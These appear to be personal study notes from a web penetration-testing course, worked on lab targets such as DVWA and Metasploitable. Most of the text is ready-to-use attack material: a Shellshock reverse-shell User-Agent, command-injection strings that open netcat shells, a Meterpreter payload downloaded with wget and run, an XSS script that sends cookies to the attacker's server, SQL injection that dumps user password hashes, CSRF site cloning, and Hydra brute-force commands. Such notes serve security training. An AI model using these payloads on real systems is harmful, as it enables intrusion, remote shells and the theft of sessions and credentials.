# Website Penetration

## HTTP Request and Response

HTTP Requests are sent to the server that contains the web page we want. It responds with a HTTP Response letting us know if it does or does not have the resource we requested, along with Headers and corresponding HTML code.

## Information Gathering and Dirb Tool

Use the same gathering tools as before along with Dirb

`dirb http://METASPLOITABLEIP` - returns list of subdirectories

## Burbsuite

A proxy that allows us to customize HTTP requests

03 Website Application Analysis -> burpsuite

Rewatch video for configuration.

## Shellshock Exploitation

Discovered in 2014. This exploit can be tested by downloading a VM from pentesterlab

Right click the cgi request to the vulnerable machine, and send to repeater

Replace the User Agent field - `() { :;}; /bin/bash -c 'nc OURIP OURPORT -e /bin/bash'`
Before sending with burpsuite, set up a listener `nc -lvp OURPORT`

This works because of a vulnerability that used to exist with how bash handled environment variables and empty functions.

`exploit/multi/http/apachee_mod_cgi_bash_env_exec` - Use msf exploit module to accomplish the same thing. Need to set RHOSTS and TARGETURI

## Command Injection

Similar to the Shellshock exploit, but this command injection takes place on the website itself.

This exploit can be tested in Metasploitable

`192.168.1.1; ls -al`

(&& / & / | also work as a command separator)

We can use netcat to exploit this

`nc -lvp IP`

`192.168.1.1; nc -e /bin/bash OURIP PORT`

Set DVWA to medium vulnerability

`192.168.1.1 & ls -al` ends up working

## Meterpreter Shell with Command Injection

Meterpreter gives us a lot more options than netcat.

So we need to create an appropriate payload, download the payload to the target machine, and execute the payload on the target machine (both of these through command injection)

Linux comes with Python installed, so we'll use a python payload.

`msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=6000 >> tester.py`

The target machine has to download our payload from somewhere, so we'll set up an Apache server. Apache comes with Linux.

`sudo service apache2 start`

in root -

`cp /home/kali/Desktop/tester.py /var/www/html/`

in DVWA - 

`; wget 192.168.1.9/tester.py` - target machine downloads our payload

set up listener -

`use exploit/multi/handler` - Set payload (python/meterpreter/reverse_tcp), set LHOST and LPORT (6000)

in DVWA - 
`; python tester.py`

## Reflected XSS and Cookie Stealing

These attacks target other website users. Stored XSS attacks get saved by the server and runs on the future user's machine. Reflected XSS doesn't get saved by the server, but will work if you send a malicious link to someone. These are often used for session stealing, to mine on other machines, or to create botnets.

We will use DVWA to test.

Enter the script into the form input, then copy the URL.

`<script>alert('1')</script>`
`<SCRIPT>alert('1')</SCRIPT>`
`<scr<script>ipt>alert('1')</script>`

Start python HTTP server to save cookies from this script

`python -m SimpleHTTPServer 8000`

```
<SCRIPT>
    document.write('<img src="http://192.168.1.9:8000/' + document.cookie + ' ">');
</SCRIPT>
```

## HTML Injection

This vulnerability gives us control over the HTML structure of a website.

`<h1>TEST<h1>`

`<meta http-equiv="refresh" content=0; url=http://google.com" />` - this redirects the user to the specified url

## SQL Injection

error based SQL Injection - `'`

`2' and '1'=1`

`2' ORDER BY 1 --'` - increase the order by number to see how many columns there are

`2' UNION SELECT 1,2 -- '`

`2' UNION SELECT database(), user() -- '` - gives us the database and user name

`2' UNION SELECT schema_name, 2 FROM information_schema.schemata --'`

`2' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '`

`2' UNION SELECT column_name, column_type, 2 FROM information_schema.columns WHERE table_schema = 'dvwa' and table_name = 'users' -- '`

Since we only have two fields that display info, we will concat the db response

`2' UNION SELECT CONCAT(user_id, ':', first_name, ':', last_name), CONCAT(user, ':', password) FROM dvwa.users -- '`

You can google a hash to attempt to decrypt it. MD5 hash decrypt websites are available

## CSRF Vulnerability

XSS makes the user execute a program they didn't want to. CSRF exploits functions that make requests inside a user's session. So, you can change details about the user that is saved in a db, perform fake bank transactions, purchase items, etc. To do this, we need to identify an active session to the target website as well as have them access our manipulated website.

We can copy the vulnerable webpage HTML/CSS and then host a copy on our own Apache web server.

Change the filepath to the CSS file. Change the form action to the target website URL. Automatically add a value to the password fields.

Changing the passwords on our fake site changes the passwords on the real site.

## Bruteforce Attack - Hydra

This will work with weak passwords

`hydra`

POST Request - 

`hydra TARGETIP http-post-form "/dvwa/login.php:USERNAMEFIELDNAME=^USER^&PASSWORDFIELDNAME=^PASS^&LOGINBUTTONFIELDNAME=submit(TYPE):ERRORALERTTEXTONFAILEDATTEMPT" -L usernames.txt -P passwords.txt`

GET Request - 

`hydra TARGETIP http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H-Cookie: COOKIEVALUEFROMBURPSUITE" -L usernames.txt -P passwords.txt

## Burpsuite Intruder

This can be simpler than the hydra tool, but the community version of burpsuite has some limitations.

Find request -> Send to Intruder -> Attack type = Cluster bomb -> Clear fields and select fields to bruteforce. Then load username and password files into Payloads tab. 302 response means redirection